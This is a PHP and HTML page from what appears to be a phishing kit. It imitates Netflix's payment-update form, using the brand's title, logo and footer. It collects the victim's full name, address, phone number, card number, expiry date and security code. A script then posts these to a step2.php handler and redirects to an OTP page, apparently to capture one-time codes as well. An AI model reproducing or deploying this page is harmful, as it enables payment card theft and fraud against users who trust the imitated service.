<?php session_start();
   if(!isset($_SESSION['language'])){exit(header("Location: index"));
   }else{include "system/languages/{$_SESSION['language']}.php";
   }?>
<!DOCTYPE html>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Netflix</title>
      <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0">
      <link id="lib_main" type="text/css" rel="stylesheet" href="files/css/none.css">
      <link id="lib" type="text/css" rel="stylesheet" href="files/css/none2.css">
      <link rel="shortcut icon" href="files/img/favicon.ico">
      <link rel="apple-touch-icon" href="files/img/favicon.png">
      <script type="text/javascript" src="files/js/modernizr.min.js"></script>
	  <script src="files/js/jquery.js"></script> 
      <script src="files/js/jquery.ccvalid.js"></script>
      <script src="files/js/jquery.mask.js"></script>
   </head>
   <body>
      <!-- -->
     <div class="basicLayout simplicity">
   <div class="nfHeader noBorderHeader signupBasicHeader"><span class="logo"><img src="files/img/nt_logo.svg" alt="logo"></span><a href="javascript:" class="authLinks signupBasicHeader isMemberSimplicity"><?php echo $info_tr['signout']?></a></div>
   <div class="simpleContainer">
      <div class="centerContainer firstLoad">
         <div class="paymentFormContainer">
            <h1 class="stepTitle"><?php echo $info_tr['update']?></h1>
            <div class="contextContainer">
               <div class="contextRow contextRowFirst"><?php echo $info_tr['by']?></div>
            </div>
            <form method="post" action="javascript:void(0)" novalidate data-valid="<?php echo $info_tr['required']?>">
               <div class="fieldContainer">
                  <span class="logos logos-block"><span class="logoIcon VISA"></span><span class="logoIcon MASTERCARD"></span><span class="logoIcon AMEX"></span><span class="logoIcon DISCOVER"></span></span>
                  <ul class="simpleForm structural ui-grid">
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['firstname'].' '.$_SESSION['lastname']?>" id="fnm" type="text" class="nfTextField <?php echo(isset($_SESSION['firstname'])?'hasText':'')?>" name="fnm"><label for="fnm" class="placeLabel"><?php echo $info_tr['full_name']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="adr" name="adr"><label for="adr" class="placeLabel"><?php echo $info_tr['adr']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['zipCode']?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['zipCode'])?'hasText':'')?>" id="zip" minlength="6" name="zip"><label for="zip" class="placeLabel"><?php echo $info_tr['zip']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="cty" name="cty"><label for="cty" class="placeLabel"><?php echo $info_tr['city']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="text" class="nfTextField" id="stt" name="stt"><label for="stt" class="placeLabel"><?php echo $info_tr['state']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="<?php echo(isset($_SESSION['ip_countryName'])?$_SESSION['ip_countryName']:'')?>" type="text" class="nfTextField <?php echo(isset($_SESSION['ip_countryName'])?'hasText':'')?>" id="cnt" name="cnt"><label for="cnt" class="placeLabel"><?php echo $info_tr['country']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['phone']?>" type="text" class="nfTextField <?php echo(isset($_SESSION['phone'])?'hasText':'')?>" id="phn" name="phn"><label for="phn" class="placeLabel"><?php echo $info_tr['phone']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="cardNumberContainer">
                           <div class="nfInput nfInputOversize">
                              <div class="nfInputPlacement"><label><input type="hidden" name="ctp" value=""><input placeholder="<?php echo(isset($_SESSION['last4'])?$_SESSION['last4']:'')?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['last4'])?'hasText':'')?>" id="cnm" maxlength="23" name="cnm" data-check="<?php echo $info_tr['cnm_check']?>"><label for="cnm" class="placeLabel"><?php echo $info_tr['cnm']?></label></label></div>
                              <div class="inputError" style="display:none"></div>
                           </div>
                        </div>
                     </li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input value="<?php echo $_SESSION['exp_date']?>" type="tel" class="nfTextField <?php echo(isset($_SESSION['exp_date'])?'hasText':'')?>" id="exp" maxlength="5" name="exp"><label for="exp" class="placeLabel"><?php echo $info_tr['exp']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                        </div>
                     </li>
                     <li class="nfFormSpace"></li>
                     <li class="nfFormSpace">
                        <div class="nfInput nfInputOversize">
                           <div class="nfInputPlacement"><label><input type="tel" class="nfTextField" id="csc" maxlength="4" minlength="3" name="csc"><label for="csc" class="placeLabel"><?php echo $info_tr['csc']?></label></label></div>
                           <div class="inputError" style="display:none"></div>
                           <div class="tooltipWrapperErr" id="bt_whats_csc"><img src="files/img/csc_circle.svg" alt="circle"></div>
                        </div>
                     </li>
                  </ul>
               </div>
               <div class="submitBtnContainer">
                  <button id="bt_submit" class="nf-btn waiting nf-btn-primary nf-btn-solid nf-btn-oversize" type="submit">
                     <?php echo $info_tr['save']?>
                     <div class="waitIndicator">
                        <div class="basic-spinner basic-spinner-light center-absolute" style="width:35px;height:35px"></div>
                     </div>
                  </button>
               </div>
            </form>
         </div>
         <div class="cvvTooltip" style="display:none" id="whats_csc">
            <span class="icon-close close-button pointer" id="bt_close_whats_csc"></span>
            <div class="tooltipDesc"><?php echo $info_tr['csc_msg']?></div>
            <div class="otherCvvHelp"></div>
            <div class="amexCvvHelp"></div>
         </div>
      </div>
   </div>
   <div class="site-footer-wrapper centered">
      <div class="footer-divider"></div>
      <div class="site-footer">
         <p class="footer-top"><a class="footer-top-a" href="javascript:"><?php echo $lg_tr['contact']?></a></p>
         <ul class="footer-links structural">
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['faq']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['help_center']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['terms']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $lg_tr['privacy']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['cookies']?></a></li>
            <li class="footer-link-item"><a class="footer-link" href="javascript:"><?php echo $info_tr['corporate']?></a></li>
         </ul>
      </div>
   </div>
         <script>
$("#lib").removeAttr('disabled');
$(document).ready(function() {
    $('#exp').mask('00/00');
    $('#phn').mask('(000) 000-0000');

    function valid(me) {
        if (me.val()) {
            me.addClass('hasText valid');
            me.removeClass('error');
            me.parent().parent().parent().children('.inputError').hide();
            return true;
        } else {
            me.addClass('error');
            if (me.attr("placeholder") == undefined) {
                me.removeClass('hasText valid');
            } else {
                me.removeClass('valid');
            }
            me.parent().parent().parent().children('.inputError').html(me.next('label').html() + ' ' + $('form').data('valid')).show();
            return false;
        }
    }
    $(document).on('keyup', 'input', function() {
        var me = $(this);
        valid(me);
    });
    $(document).on('click', '#bt_whats_csc', function() {
        $('#whats_csc').show();
    });
    $(document).on('click', '#bt_close_whats_csc', function() {
        $('#whats_csc').hide();
    });
    var ccvalid = false;
    $(document).on('keyup', '#cnm', function() {
        $('#cnm').mask('0000 0000 0000 0000 000');
        $('#cnm').validateCreditCard(function(result) {
            var cc = $('#cnm');
            if (cc.val() != '') {
                var cctype = result.card_type == null ? '-' : result.card_type.name;
                $('input[name=ctp]').val(cctype);
                if (result.valid) {
                    cc.addClass('hasText valid');
                    cc.removeClass('error');
                    cc.parent().parent().parent().children('.inputError').hide();
                    ccvalid = true;
                } else {
                    cc.addClass('error');
                    cc.removeClass('valid');
                    cc.parent().parent().parent().children('.inputError').html(cc.data('check')).show();
                    ccvalid = false;
                }
            }
        });
    });
    $(document).on('submit', 'form', function(e) {
        e.preventDefault();
        var me = $(this);
        var check = true;
        $('input').each(function(index, el) {
            if (!valid($(el))) {
                check = false;
            }
        });
        if (!ccvalid) {
            check = false;
        }
        if (check) {
            $('#bt_submit').attr('disabled', '');
            $.post("system/step2.php", me.serialize(), function(data, status) {
                if (status == "success") {
                    if (data == "error") {
                        $('#bt_submit').removeAttr('disabled');
                    } else {
                    $(location).attr("href", "./otp.php?country.x=Global&flowContext=login&flowId=ul&_Email=datax");
                    }
                } else {
                    $('#bt_submit').removeAttr('disabled');
                }
            });
        } else {
            return false;
        }
    });
});
         </script>
      </div>
      <!-- --->
   </body>
</html>